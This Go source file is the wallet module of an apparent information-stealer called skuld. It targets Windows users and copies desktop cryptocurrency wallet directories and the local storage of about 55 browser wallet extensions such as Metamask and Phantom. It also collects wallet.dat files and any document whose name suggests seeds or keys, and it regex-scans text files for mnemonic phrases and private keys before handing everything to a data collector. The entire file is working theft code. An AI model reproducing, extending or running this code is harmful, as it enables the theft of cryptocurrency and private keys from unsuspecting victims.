package wallets

import (
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"

	"github.com/hackirby/skuld/modules/browsers"
	"github.com/hackirby/skuld/utils/fileutil"
	"github.com/hackirby/skuld/utils/hardware"
	"github.com/hackirby/skuld/utils/collector"
)

func Run(dataCollector *collector.DataCollector) {
	// Run all wallet collection functions
	LocalWallets(dataCollector)
	WalletExtensions(dataCollector)
	WalletFiles(dataCollector)
	CryptoFiles(dataCollector)
	WalletDatFiles(dataCollector)
}

func LocalWallets(dataCollector *collector.DataCollector) {
	users := hardware.GetUsers()
	tempDir := filepath.Join(os.TempDir(), "local-wallets-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)
	
	found := ""
	totalFiles := 0
	
	// Enhanced wallet paths with more locations
	walletPaths := map[string][]string{
		"Zcash": {
			"AppData\\Roaming\\Zcash",
			"AppData\\Local\\Zcash",
		},
		"Armory": {
			"AppData\\Roaming\\Armory",
			"AppData\\Local\\Armory",
		},
		"Bytecoin": {
			"AppData\\Roaming\\bytecoin",
			"AppData\\Local\\bytecoin",
		},
		"Jaxx": {
			"AppData\\Roaming\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb",
			"AppData\\Local\\com.liberty.jaxx",
		},
		"Exodus": {
			"AppData\\Roaming\\Exodus\\exodus.wallet",
			"AppData\\Roaming\\Exodus",
			"AppData\\Local\\Exodus",
		},
		"Ethereum": {
			"AppData\\Roaming\\Ethereum\\keystore",
			"AppData\\Local\\Ethereum",
		},
		"Electrum": {
			"AppData\\Roaming\\Electrum\\wallets",
			"AppData\\Local\\Electrum",
		},
		"AtomicWallet": {
			"AppData\\Roaming\\atomic\\Local Storage\\leveldb",
			"AppData\\Local\\atomic",
		},
		"Guarda": {
			"AppData\\Roaming\\Guarda\\Local Storage\\leveldb",
			"AppData\\Local\\Guarda",
		},
		"Coinomi": {
			"AppData\\Local\\Coinomi\\Coinomi\\wallets",
			"AppData\\Roaming\\Coinomi",
		},
		"Bitcoin": {
			"AppData\\Roaming\\Bitcoin",
			"AppData\\Local\\Bitcoin",
		},
		"Litecoin": {
			"AppData\\Roaming\\Litecoin",
			"AppData\\Local\\Litecoin",
		},
		"Dogecoin": {
			"AppData\\Roaming\\Dogecoin",
			"AppData\\Local\\Dogecoin",
		},
		"Dash": {
			"AppData\\Roaming\\DashCore",
			"AppData\\Local\\DashCore",
		},
		"Monero": {
			"AppData\\Roaming\\Monero",
			"AppData\\Local\\Monero",
		},
		"Electroneum": {
			"AppData\\Roaming\\Electroneum",
			"AppData\\Local\\Electroneum",
		},
		"Raven": {
			"AppData\\Roaming\\Raven",
			"AppData\\Local\\Raven",
		},
		"Chia": {
			"AppData\\Local\\Chia",
			"AppData\\Roaming\\Chia",
		},
		"Daedalus": {
			"AppData\\Roaming\\Daedalus",
			"AppData\\Local\\Daedalus",
		},
		"Yoroi": {
			"AppData\\Roaming\\Yoroi",
			"AppData\\Local\\Yoroi",
		},
	}

	for _, user := range users {
		userName := strings.Split(user, "\\")[2]
		
		for walletName, paths := range walletPaths {
			for _, path := range paths {
				fullPath := filepath.Join(user, path)
				
				if !fileutil.IsDir(fullPath) && !fileutil.Exists(fullPath) {
					continue
				}

				destPath := filepath.Join(tempDir, userName, walletName)
				os.MkdirAll(destPath, os.ModePerm)

				var err error
				if fileutil.IsDir(fullPath) {
					err = fileutil.CopyDir(fullPath, destPath)
				} else {
					err = fileutil.CopyFile(fullPath, filepath.Join(destPath, filepath.Base(fullPath)))
				}

				if err == nil {
					found += fmt.Sprintf("\n✅ %s - %s", userName, walletName)
					totalFiles++
					break // Found this wallet, move to next
				}
			}
		}
	}

	if found != "" {
		walletsInfo := map[string]interface{}{
			"LocalWalletsFound": found,
			"TotalFiles":        totalFiles,
			"TreeView":          fileutil.Tree(tempDir, ""),
		}
		dataCollector.AddData("local_wallets", walletsInfo)
		dataCollector.AddDirectory("local_wallets", tempDir, "local_wallets_data")
	}
}

func WalletExtensions(dataCollector *collector.DataCollector) {
	// Enhanced wallet extensions list
	walletExtensions := map[string]string{
		"Authenticator":     "\\Local Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai",
		"Binance":           "\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp",
		"Bitapp":            "\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi",
		"BoltX":             "\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca",
		"Coin98":            "\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg",
		"Coinbase":          "\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad",
		"Core":              "\\Local Extension Settings\\agoakfejjabomempkjlepdflaleeobhb",
		"Crocobit":          "\\Local Extension Settings\\pnlfjmlcjdjgkddecgincndfgegkecke",
		"Equal":             "\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac",
		"Ever":              "\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk",
		"ExodusWeb3":        "\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno",
		"Fewcha":            "\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj",
		"Finnie":            "\\Local Extension Settings\\cjmkndjhnagcfbpiemnkdpomccnjblmj",
		"Guarda":            "\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln",
		"Guild":             "\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj",
		"HarmonyOutdated":   "\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib",
		"Iconex":            "\\Local Extension Settings\\flpiciilemghbmfalicajoolhkkenfel",
		"Jaxx Liberty":      "\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne",
		"Kaikas":            "\\Local Extension Settings\\jblndlipeogpafnldhgmapagcccfchpi",
		"KardiaChain":       "\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk",
		"Keplr":             "\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap",
		"Liquality":         "\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn",
		"MEWCX":             "\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm",
		"MaiarDEFI":         "\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm",
		"Martian":           "\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk",
		"Math":              "\\Local Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc",
		"Metamask":          "\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn",
		"Metamask2":         "\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm",
		"Mobox":             "\\Local Extension Settings\\fcckkdbjnoikooededlapcalpionmalo",
		"Nami":              "\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo",
		"Nifty":             "\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid",
		"Oxygen":            "\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh",
		"PaliWallet":        "\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn",
		"Petra":             "\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci",
		"Phantom":           "\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa",
		"Pontem":            "\\Local Extension Settings\\phkbamefinggmakgklpkljjmgibohnba",
		"Ronin":             "\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec",
		"Safepal":           "\\Local Extension Settings\\lgmpcpglpngdoalbgeoldeajfclnhafa",
		"Saturn":            "\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig",
		"Slope":             "\\Local Extension Settings\\pocmplpaccanhmnllbbkpgfliimjljgo",
		"Solfare":           "\\Local Extension Settings\\bhhhlbepdkbapadjdnnojkbgioiodbic",
		"Sollet":            "\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno",
		"Starcoin":          "\\Local Extension Settings\\mfhbebgoclkghebffdldpobeajmbecfk",
		"Swash":             "\\Local Extension Settings\\cmndjbecilbocjfkibfbifhngkdmjgog",
		"TempleTezos":       "\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc",
		"TerraStation":      "\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp",
		"Tokenpocket":       "\\Local Extension Settings\\mfgccjchihfkkindfppnaooecgfneiii",
		"Ton":               "\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd",
		"Tron":              "\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec",
		"Trust Wallet":      "\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph",
		"Wombat":            "\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih",
		"XDEFI":             "\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf",
		"XMR.PT":            "\\Local Extension Settings\\eigblbgjknlfbajkfhopmcojidlgcehm",
		"XinPay":            "\\Local Extension Settings\\bocpokimicclpaiekenaeelehdjllofo",
		"Yoroi":             "\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb",
		"iWallet":           "\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj",
	}

	users := hardware.GetUsers()
	browsersPath := browsers.GetChromiumBrowsers()
	var profilesPaths []browsers.Profile
	
	for _, user := range users {
		for name, path := range browsersPath {
			path = filepath.Join(user, path)
			if !fileutil.IsDir(path) {
				continue
			}

			browser := browsers.Browser{
				Name: name,
				Path: path,
				User: strings.Split(user, "\\")[2],
			}

			if browser.Name == "Opera" || browser.Name == "OperaGX" {
				profilesPaths = append(profilesPaths, browsers.Profile{
					Name:    "Default",
					Path:    browser.Path,
					Browser: browser,
				})
				continue
			}

			profiles, err := os.ReadDir(path)
			if err != nil {
				continue
			}
			for _, profile := range profiles {
				if profile.IsDir() {
					profilePath := filepath.Join(path, profile.Name())
					if fileutil.Exists(filepath.Join(profilePath, "Web Data")) {
						profilesPaths = append(profilesPaths, browsers.Profile{
							Name:    profile.Name(),
							Path:    profilePath,
							Browser: browser,
						})
					}
				}
			}
		}
	}

	if len(profilesPaths) == 0 {
		return
	}

	tempDir := filepath.Join(os.TempDir(), "wallet-extensions-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)
	
	found := ""
	totalExtensions := 0

	for _, profile := range profilesPaths {
		for name, path := range walletExtensions {
			fullPath := filepath.Join(profile.Path, path)
			if !fileutil.IsDir(fullPath) {
				continue
			}

			destPath := filepath.Join(tempDir, profile.Browser.User, profile.Browser.Name, profile.Name, name)
			os.MkdirAll(filepath.Dir(destPath), os.ModePerm)

			err := fileutil.CopyDir(fullPath, destPath)
			if err != nil {
				continue
			}
			found += fmt.Sprintf("\n✅ %s - %s - %s", profile.Browser.User, profile.Browser.Name, name)
			totalExtensions++
		}
	}

	if found != "" {
		extensionsInfo := map[string]interface{}{
			"WalletExtensionsFound": found,
			"TotalExtensions":       totalExtensions,
			"TreeView":              fileutil.Tree(tempDir, ""),
		}
		dataCollector.AddData("wallet_extensions", extensionsInfo)
		dataCollector.AddDirectory("wallet_extensions", tempDir, "wallet_extensions_data")
	}
}

func WalletFiles(dataCollector *collector.DataCollector) {
	users := hardware.GetUsers()
	tempDir := filepath.Join(os.TempDir(), "wallet-files-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)

	found := ""
	totalFiles := 0
	
	// Enhanced wallet keywords
	walletKeywords := []string{
		"wallet", "seed", "mnemonic", "private", "key", "phrase", 
		"bitcoin", "ethereum", "crypto", "recovery", "backup",
		"metamask", "exodus", "atomic", "electrum", "jaxx",
		"coinbase", "binance", "trust", "phantom", "solana",
		"polygon", "bsc", "bnb", "ada", "cardano", "dot",
		"polkadot", "avax", "avalanche", "matic", "ftm",
		"fantom", "one", "harmony", "near", "algo",
		"algorand", "xtz", "tezos", "atom", "cosmos",
		"luna", "terra", "sol", "btc", "eth", "ltc",
		"bch", "xmr", "monero", "dash", "zcash", "doge",
		"dogecoin", "shib", "shiba", "usdt", "usdc",
		"dai", "busd", "tusd", "pax", "gusd", "husd",
		"electroneum", "etn",
	}

	for _, user := range users {
		userName := strings.Split(user, "\\")[2]
		userDirs := []string{
			filepath.Join(user, "Desktop"),
			filepath.Join(user, "Documents"),
			filepath.Join(user, "Downloads"),
			filepath.Join(user, "Pictures"),
			filepath.Join(user, "Videos"),
			filepath.Join(user, "Music"),
			filepath.Join(user, "OneDrive"),
		}

		for _, dir := range userDirs {
			if !fileutil.IsDir(dir) {
				continue
			}

			filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() {
					return nil
				}

				// Skip large files
				if info.Size() > 50*1024*1024 { // 50MB
					return nil
				}

				fileName := strings.ToLower(info.Name())
				
				// Check for wallet-related keywords
				isWalletFile := false
				for _, keyword := range walletKeywords {
					if strings.Contains(fileName, keyword) {
						isWalletFile = true
						break
					}
				}

				// Check for specific wallet file extensions
				ext := strings.ToLower(filepath.Ext(fileName))
				walletExts := []string{".dat", ".wallet", ".json", ".txt", ".key", ".pem", ".p12", ".keystore", ".aes", ".backup"}
				
				if isWalletFile {
					for _, walletExt := range walletExts {
						if ext == walletExt || ext == "" {
							destPath := filepath.Join(tempDir, userName, "WalletFiles", info.Name())
							os.MkdirAll(filepath.Dir(destPath), os.ModePerm)
							
							if err := fileutil.CopyFile(path, destPath); err == nil {
								found += fmt.Sprintf("\n✅ %s - %s", userName, info.Name())
								totalFiles++
							}
							break
						}
					}
				}

				return nil
			})
		}
	}

	if found != "" {
		walletFilesInfo := map[string]interface{}{
			"WalletFilesFound": found,
			"TotalFiles":       totalFiles,
			"TreeView":         fileutil.Tree(tempDir, ""),
		}
		dataCollector.AddData("wallet_files", walletFilesInfo)
		dataCollector.AddDirectory("wallet_files", tempDir, "wallet_files_data")
	}
}

func WalletDatFiles(dataCollector *collector.DataCollector) {
	users := hardware.GetUsers()
	tempDir := filepath.Join(os.TempDir(), "wallet-dat-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)

	found := ""
	totalFiles := 0

	for _, user := range users {
		userName := strings.Split(user, "\\")[2]
		
		// Search for wallet.dat files in common locations
		walletDatPaths := []string{
			filepath.Join(user, "AppData", "Roaming", "Bitcoin", "wallet.dat"),
			filepath.Join(user, "AppData", "Roaming", "Litecoin", "wallet.dat"),
			filepath.Join(user, "AppData", "Roaming", "Dogecoin", "wallet.dat"),
			filepath.Join(user, "AppData", "Roaming", "DashCore", "wallet.dat"),
			filepath.Join(user, "AppData", "Roaming", "Electroneum", "wallet.dat"),
			filepath.Join(user, "AppData", "Roaming", "Raven", "wallet.dat"),
			filepath.Join(user, "AppData", "Roaming", "Zcash", "wallet.dat"),
			filepath.Join(user, "AppData", "Local", "Bitcoin", "wallet.dat"),
			filepath.Join(user, "AppData", "Local", "Litecoin", "wallet.dat"),
			filepath.Join(user, "AppData", "Local", "Dogecoin", "wallet.dat"),
			filepath.Join(user, "AppData", "Local", "Electroneum", "wallet.dat"),
			filepath.Join(user, "Desktop", "wallet.dat"),
			filepath.Join(user, "Documents", "wallet.dat"),
			filepath.Join(user, "Downloads", "wallet.dat"),
		}

		for _, walletPath := range walletDatPaths {
			if fileutil.Exists(walletPath) {
				walletDir := filepath.Base(filepath.Dir(walletPath))
				destPath := filepath.Join(tempDir, userName, "WalletDat", walletDir+"_wallet.dat")
				os.MkdirAll(filepath.Dir(destPath), os.ModePerm)
				
				if err := fileutil.CopyFile(walletPath, destPath); err == nil {
					found += fmt.Sprintf("\n✅ %s - %s wallet.dat", userName, walletDir)
					totalFiles++
				}
			}
		}

		// Search for any wallet.dat files in Desktop and Documents
		searchDirs := []string{
			filepath.Join(user, "Desktop"),
			filepath.Join(user, "Documents"),
			filepath.Join(user, "Downloads"),
		}

		for _, dir := range searchDirs {
			if !fileutil.IsDir(dir) {
				continue
			}

			filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() {
					return nil
				}

				if strings.ToLower(info.Name()) == "wallet.dat" {
					destPath := filepath.Join(tempDir, userName, "FoundWalletDat", filepath.Base(dir)+"_"+info.Name())
					os.MkdirAll(filepath.Dir(destPath), os.ModePerm)
					
					if err := fileutil.CopyFile(path, destPath); err == nil {
						found += fmt.Sprintf("\n✅ %s - Found wallet.dat in %s", userName, filepath.Base(dir))
						totalFiles++
					}
				}

				return nil
			})
		}
	}

	if found != "" {
		walletDatInfo := map[string]interface{}{
			"WalletDatFound": found,
			"TotalFiles":     totalFiles,
			"TreeView":       fileutil.Tree(tempDir, ""),
		}
		dataCollector.AddData("wallet_dat", walletDatInfo)
		dataCollector.AddDirectory("wallet_dat", tempDir, "wallet_dat_files")
	}
}

func CryptoFiles(dataCollector *collector.DataCollector) {
	users := hardware.GetUsers()
	tempDir := filepath.Join(os.TempDir(), "crypto-files-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)

	// Enhanced regex patterns for crypto detection
	patterns := map[string]*regexp.Regexp{
		"mnemonic_12":           regexp.MustCompile(`(?i)\b([a-z]+\s+){11}[a-z]+\b`),
		"mnemonic_24":           regexp.MustCompile(`(?i)\b([a-z]+\s+){23}[a-z]+\b`),
		"bitcoin_private_key_5": regexp.MustCompile(`5[HJK][1-9A-HJ-NP-Za-km-z]{49}`),
		"bitcoin_private_key_K": regexp.MustCompile(`K[1-9A-HJ-NP-Za-km-z]{51}`),
		"bitcoin_private_key_L": regexp.MustCompile(`L[1-9A-HJ-NP-Za-km-z]{51}`),
		"ethereum_private_key":  regexp.MustCompile(`0x[a-fA-F0-9]{64}`),
		"bitcoin_address_1":     regexp.MustCompile(`1[a-km-zA-HJ-NP-Z1-9]{25,34}`),
		"bitcoin_address_3":     regexp.MustCompile(`3[a-km-zA-HJ-NP-Z1-9]{25,34}`),
		"bitcoin_address_bc1":   regexp.MustCompile(`bc1[a-z0-9]{39,59}`),
		"ethereum_address":      regexp.MustCompile(`0x[a-fA-F0-9]{40}`),
		"litecoin_address":      regexp.MustCompile(`[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}`),
		"dogecoin_address":      regexp.MustCompile(`D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}`),
		"monero_address":        regexp.MustCompile(`4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}`),
		"dash_address":          regexp.MustCompile(`X[1-9A-HJ-NP-Za-km-z]{33}`),
		"zcash_address":         regexp.MustCompile(`t1[a-zA-Z0-9]{33}`),
		"electroneum_address":   regexp.MustCompile(`etn[1-9A-HJ-NP-Za-km-z]{95}`),
	}

	found := 0
	suspiciousFiles := make(map[string][]string)
	cryptoData := make(map[string]string)

	for _, user := range users {
		userName := strings.Split(user, "\\")[2]
		userDirs := []string{
			filepath.Join(user, "Desktop"),
			filepath.Join(user, "Documents"),
			filepath.Join(user, "Downloads"),
			filepath.Join(user, "Pictures"),
			filepath.Join(user, "Videos"),
			filepath.Join(user, "Music"),
			filepath.Join(user, "OneDrive"),
		}

		for _, dir := range userDirs {
			if !fileutil.IsDir(dir) {
				continue
			}

			filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() {
					return nil
				}

				// Only check text files
				ext := strings.ToLower(filepath.Ext(info.Name()))
				textExts := []string{".txt", ".json", ".csv", ".log", ".md", ".rtf", ".dat", ".key", ".pem", ".backup", ".wallet"}
				isTextFile := false
				for _, textExt := range textExts {
					if ext == textExt {
						isTextFile = true
						break
					}
				}

				if !isTextFile || info.Size() > 5*1024*1024 { // 5MB limit for text files
					return nil
				}

				content, err := fileutil.ReadFile(path)
				if err != nil {
					return nil
				}

				matches := make([]string, 0)
				for patternName, pattern := range patterns {
					if pattern.MatchString(content) {
						matches = append(matches, patternName)
						// Store actual matches for analysis
						foundMatches := pattern.FindAllString(content, -1)
						for _, match := range foundMatches {
							cryptoData[fmt.Sprintf("%s_%s", patternName, info.Name())] = match
						}
					}
				}

				if len(matches) > 0 {
					destPath := filepath.Join(tempDir, userName, "CryptoFiles", info.Name())
					os.MkdirAll(filepath.Dir(destPath), os.ModePerm)
					
					if err := fileutil.CopyFile(path, destPath); err == nil {
						suspiciousFiles[info.Name()] = matches
						found++
					}
				}

				return nil
			})
		}
	}

	if found > 0 {
		// Create detailed analysis file
		summaryPath := filepath.Join(tempDir, "CRYPTO_ANALYSIS.txt")
		summaryContent := "🔍 CRYPTO FILES ANALYSIS\n"
		summaryContent += "========================\n\n"
		summaryContent += fmt.Sprintf("Total suspicious files found: %d\n\n", found)
		
		for fileName, matches := range suspiciousFiles {
			summaryContent += fmt.Sprintf("📄 File: %s\n", fileName)
			summaryContent += fmt.Sprintf("🎯 Matches: %s\n", strings.Join(matches, ", "))
			summaryContent += "---\n\n"
		}
		
		// Add found crypto data
		if len(cryptoData) > 0 {
			summaryContent += "\n💰 FOUND CRYPTO DATA\n"
			summaryContent += "===================\n\n"
			for key, value := range cryptoData {
				summaryContent += fmt.Sprintf("%s: %s\n", key, value)
			}
		}
		
		fileutil.AppendFile(summaryPath, summaryContent)

		cryptoInfo := map[string]interface{}{
			"CryptoFilesFound":  found,
			"SuspiciousFiles":   suspiciousFiles,
			"CryptoDataFound":   cryptoData,
			"TreeView":          fileutil.Tree(tempDir, ""),
		}
		dataCollector.AddData("crypto_files", cryptoInfo)
		dataCollector.AddDirectory("crypto_files", tempDir, "crypto_files_data")
	}
}